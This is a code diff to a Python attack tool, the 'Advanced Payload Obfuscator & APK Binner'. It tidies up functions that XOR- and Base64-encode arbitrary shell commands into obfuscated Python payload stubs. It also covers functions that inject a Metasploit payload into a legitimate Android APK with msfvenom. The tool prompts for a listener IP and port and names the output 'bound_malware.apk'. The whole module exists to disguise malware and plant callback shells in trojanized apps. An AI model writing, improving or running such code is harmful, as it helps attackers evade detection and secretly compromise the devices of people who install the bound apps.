@@ -1,11 +1,12 @@
 """
-Aadi — Advanced Payload Obfuscator & APK Binner Module (Fully Fixed)
+Aadi — Advanced Payload Obfuscator & APK Binner Module (Fully Fixed & Optimized)
 Author: Aaditya Kumar Pandey | Instagram: @aadi_97621
 """
 
 import os
 import subprocess
 import base64
+from typing import Optional
 from rich.console import Console
 from rich.panel import Panel
 from rich.prompt import Prompt, Confirm
@@ -19,9 +20,9 @@ def xor_encrypt(data: bytes, key: int = 0x5A) -> bytes:
     return bytes([b ^ key for b in data])
 
 
-def generate_obfuscated_shellcode(raw_command: str, output_file: str = "obfuscated_payload.py") -> str:
+def generate_obfuscated_shellcode(raw_command: str, output_file: str = "obfuscated_payload.py") -> Optional[str]:
     """Generate XOR encoded and Base64 wrapped Python payload stub using safe string replacement."""
-    if not raw_command:
+    if not raw_command or not raw_command.strip():
         console.print("[bold red]✗ Command string cannot be empty![/]")
         return None
 
@@ -81,12 +82,12 @@ if __name__ == "__main__":
 
 def bind_apk_with_payload(legitimate_apk: str, payload_apk: str) -> bool:
     """Guide or automate APK binding using msfvenom template injection with robust error checks."""
-    if not os.path.exists(legitimate_apk):
-        console.print(f"[bold red]✗ Legitimate APK not found:[/] {legitimate_apk}")
+    if not legitimate_apk or not os.path.exists(legitimate_apk):
+        console.print(f"[bold red]✗ Legitimate APK not found or invalid path:[/] {legitimate_apk}")
         return False
 
-    if not os.path.exists(payload_apk):
-        console.print(f"[bold red]✗ Payload APK not found:[/] {payload_apk}")
+    if not payload_apk or not os.path.exists(payload_apk):
+        console.print(f"[bold red]✗ Payload APK not found or invalid path:[/] {payload_apk}")
         return False
 
     console.print(Panel(
@@ -106,6 +107,8 @@ def bind_apk_with_payload(legitimate_apk: str, payload_apk: str) -> bool:
         lhost = Prompt.ask("[cyan]Enter LHOST (Listener IP)[/]")
         lport = Prompt.ask("[cyan]Enter LPORT (Listener Port)[/]", default="4444")
         out_name = Prompt.ask("[cyan]Enter output bound APK filename[/]", default="bound_malware.apk")
+        if not out_name.endswith(".apk"):
+            out_name += ".apk"
 
         cmd = [
             "msfvenom", "-x", legitimate_apk,
@@ -141,7 +144,7 @@ def bind_apk_with_payload(legitimate_apk: str, payload_apk: str) -> bool:
     return False
 
 
-def payload_obfuscation_menu():
+def payload_obfuscation_menu() -> None:
     """Interactive menu for advanced payload operations with clean exit handling."""
     while True:
         console.rule("[bold magenta]🎯 Advanced Payload Obfuscator & Binner[/]")
@@ -149,7 +152,6 @@ def payload_obfuscation_menu():
         console.print("  [cyan]2.[/] Legitimate APK + Metasploit Payload Binner")
         console.print("  [cyan]0.[/] Back to Main Menu")
 
-        # यहाँ फिक्स किया गया है: प्रॉम्प्ट स्ट्रिंग और choices अलग-अलग पास किए गए हैं
         choice = Prompt.ask(
             "[cyan]Select Option ▶[/]",
             choices=["0", "1", "2"],
@@ -160,7 +162,7 @@ def payload_obfuscation_menu():
             break
         elif choice == "1":
             cmd = Prompt.ask("[cyan]Enter shell command or payload string to obfuscate[/]")
-            if cmd:
+            if cmd and cmd.strip():
                 out_filename = Prompt.ask(
                     "[cyan]Enter output Python filename[/]",
                     default="obfuscated_payload.py"
